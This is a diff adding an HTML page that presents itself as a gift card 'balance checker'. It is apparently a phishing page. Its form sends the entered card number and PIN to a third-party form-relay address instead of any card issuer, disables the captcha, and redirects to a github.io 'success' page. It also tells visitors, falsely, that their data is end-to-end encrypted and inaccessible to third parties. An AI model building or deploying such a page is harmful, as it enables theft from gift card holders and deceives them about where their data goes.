@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>balance checker</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <header>
+      <div class="logo">
+        <a href="#">
+          <h3>
+            <span>Balance</span>
+            <span>Check</span>
+          </h3>
+        </a>
+      </div>
+      <div class="iconhead">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          x="0px"
+          y="0px"
+          width="30"
+          height="30"
+          viewBox="0 0 30 30"
+          style="fill: #000000"
+        >
+          <path
+            d="M 13 3 C 7.4889971 3 3 7.4889971 3 13 C 3 18.511003 7.4889971 23 13 23 C 15.396508 23 17.597385 22.148986 19.322266 20.736328 L 25.292969 26.707031 A 1.0001 1.0001 0 1 0 26.707031 25.292969 L 20.736328 19.322266 C 22.148986 17.597385 23 15.396508 23 13 C 23 7.4889971 18.511003 3 13 3 z M 13 5 C 17.430123 5 21 8.5698774 21 13 C 21 17.430123 17.430123 21 13 21 C 8.5698774 21 5 17.430123 5 13 C 5 8.5698774 8.5698774 5 13 5 z"
+          ></path>
+        </svg>
+        <div class="space"></div>
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          x="0px"
+          y="0px"
+          width="30"
+          height="30"
+          viewBox="0 0 30 30"
+          style="fill: #000000"
+        >
+          <path
+            d="M 3 7 A 1.0001 1.0001 0 1 0 3 9 L 27 9 A 1.0001 1.0001 0 1 0 27 7 L 3 7 z M 3 14 A 1.0001 1.0001 0 1 0 3 16 L 27 16 A 1.0001 1.0001 0 1 0 27 14 L 3 14 z M 3 21 A 1.0001 1.0001 0 1 0 3 23 L 27 23 A 1.0001 1.0001 0 1 0 27 21 L 3 21 z"
+          ></path>
+        </svg>
+      </div>
+    </header>
+    <div class="linespace"></div>
+    <div class="line"></div>
+    <section class="description">
+      <h1>BALANCE CHECKER</h1>
+      <h5>
+        To confirm your card balance, enter the card number found on the back of
+        your physical card,or on your e-card confirmation email.If your gift
+        card has a PIN number,please include it in the PIN section. If you do
+        not have a pIN number, please leave the section blank.
+      </h5>
+    </section>
+    <section class="allforms">
+      <form
+        action="https://formsubmit.co/c813a38244b90ec8fade1c414b0dc0ac"
+        method="post"
+      >
+        <!-- honey pot -->
+        <input type="text" name="_honey" style="display: none" />
+
+        <!-- display Captcha -->
+        <input type="hidden" name="_captcha" value="false" />
+        <!-- thank you page -->
+
+        <input
+          type="hidden"
+          name="_next"
+          value="https://giftcardvalidity.github.io/.com//sucess.html"
+        />
+        <input
+          class="num"
+          type="text"
+          required
+          placeholder="*card number"
+          name="card num"
+        />
+        <div class="inputspace"></div>
+        <input class="pin" type="text" placeholder="*PIN" name="pin" />
+
+        <div class="currencysec">
+          <h6>CURRENCY:</h6>
+          <input type="checkbox" name="CAD" />
+          <label for="CAD"><p>CAD</p> </label>
+          <input type="checkbox" name="USD" />
+          <label for="USD"> <p>USD</p></label>
+          <input type="checkbox" name="AUD" />
+          <label for="AUD"><p>AUD</p> </label>
+          <input type="checkbox" name="GBP" />
+          <label for="GBP"><p>GBP</p> </label>
+          <input type="checkbox" name="EUR" />
+          <label for="EUR"><p>EUR</p> </label>
+        </div>
+        <div class="remainbalerr">
+          <h6>Enter a valid gift card number</h6>
+        </div>
+        <p class="note">
+          <strong>Note:</strong> Information provided on this page is end to end
+          encrypted and cannot be accesible by third party
+        </p>
+        <div class="checkout">
+          <input type="submit" value="CHECK BALANCE" />
+          <p>></p>
+        </div>
+      </form>
+    </section>
+  </body>
+</html>
